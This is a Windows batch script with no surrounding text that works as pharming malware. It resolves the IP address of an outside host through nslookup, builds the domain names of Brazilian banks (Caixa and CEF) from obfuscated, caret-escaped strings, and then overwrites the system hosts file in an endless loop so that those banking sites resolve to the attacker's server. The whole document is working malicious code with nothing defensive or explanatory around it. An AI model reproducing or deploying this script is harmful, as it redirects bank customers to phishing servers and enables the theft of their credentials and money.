@echo off
@break off

ver|find "Windows 98">nul
if not errorlevel 1 goto win

if not exist %WinDir%\system32\teskmgr.exe goto dns
if exist %WinDir%\system32\teskmgr.exe goto chk

:chk
set ping=%windir%\system32\ping.exe
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto dns
goto chk

:dns
for /f "tokens=2" %%D in ('nslookup mola.cocanaocola.com ^| find "Address"') do set dns1=%%D
set w=www
set co=com
set go=gov
set ca=cai
set c1=in^t^erne^t%ca%x^a.%ca%x^a.%go%.b^r
set c2=%w%.%ca%x^a.%co%.b^r
set c3=%w%^.%ca%x^a^.%go%.b^r
set c4=%w%^.c^ef.%co%.b^r
set c5=%w%.^c^e^f.^%go%.^br
set c6=%w%.%ca%x^aeco^nom^ic^a.%co%.br
set c7=%w%.%ca%x^ae^con^om^ic^a^.%go%^.b^r
set c8=%w%.%ca%xaec^on^omi^cafe^d^e^r^al^.%co%.^b^r
set c9=%ca%x^a^.%co%^.^b^r
set c10=%ca%^xa^.^%go%.^br
set c11=c^e^f.^%co%^.^b^r
set c12=ce^f.%go%^.^br
set c13=%ca%xae^co^n^o^mica.%co%^.^br
set c14=%ca%xa^e^c^o^no^mi^ca^.^%go%.^b^r
echo %dns1% %c1%>%windir%\temp\cevfr.007
echo %dns1% %c2%>>%windir%\temp\cevfr.007
echo %dns1% %c3%>>%windir%\temp\cevfr.007
echo %dns1% %c4%>>%windir%\temp\cevfr.007
echo %dns1% %c5%>>%windir%\temp\cevfr.007
echo %dns1% %c6%>>%windir%\temp\cevfr.007
echo %dns1% %c7%>>%windir%\temp\cevfr.007
echo %dns1% %c8%>>%windir%\temp\cevfr.007
echo %dns1% %c9%>>%windir%\temp\cevfr.007
echo %dns1% %c10%>>%windir%\temp\cevfr.007
echo %dns1% %c11%>>%windir%\temp\cevfr.007
echo %dns1% %c12%>>%windir%\temp\cevfr.007
echo %dns1% %c13%>>%windir%\temp\cevfr.007
echo %dns1% %c14%>>%windir%\temp\cevfr.007
:7
type %windir%\temp\cevfr.007>%windir%\system32\drivers\etc\hosts
goto 7

:win
exit
	
